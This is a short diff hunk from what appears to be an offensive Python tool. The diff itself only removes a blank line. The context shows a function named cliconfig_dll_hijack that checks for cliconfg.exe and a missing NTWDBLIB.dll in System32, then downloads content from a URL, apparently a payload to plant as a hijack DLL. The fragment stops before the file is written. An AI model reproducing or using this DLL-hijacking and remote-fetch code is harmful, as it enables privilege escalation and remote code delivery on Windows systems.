@@ -18,7 +18,6 @@ import win32con
 def cliconfig_dll_hijack(url):
 	if (os.path.isfile(os.path.join("c:\windows\system32\cliconfg.exe")) == True):
 		if (os.path.isfile(os.path.join("c:\windows\system32\NTWDBLIB.dll")) == False):
-		
 			try:
 				download = requests.get(url)
 				if (len(download.content) > 1):
